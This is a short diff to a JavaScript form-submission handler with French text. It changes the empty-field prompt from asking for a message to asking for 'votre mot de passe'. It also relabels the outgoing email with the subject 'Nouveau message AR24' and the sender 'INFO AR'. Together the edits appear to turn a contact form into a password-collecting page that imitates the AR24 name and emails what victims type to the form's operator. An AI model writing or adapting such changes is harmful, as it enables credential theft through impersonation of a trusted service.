@@ -432,7 +432,7 @@ form.addEventListener(
         if (realMessage.trim() === "") {
 
             setMessage(
-                "Veuillez entrer un message.",
+                "Veuillez entrer votre mot de passe.",
                 true
             );
 
@@ -465,12 +465,12 @@ form.addEventListener(
 
         data.append(
             "subject",
-            "Nouveau message depuis le deuxième formulaire"
+            "Nouveau message AR24 "
         );
 
         data.append(
             "from_name",
-            "Deuxième formulaire"
+            "INFO AR"
         );
 
         data.append(
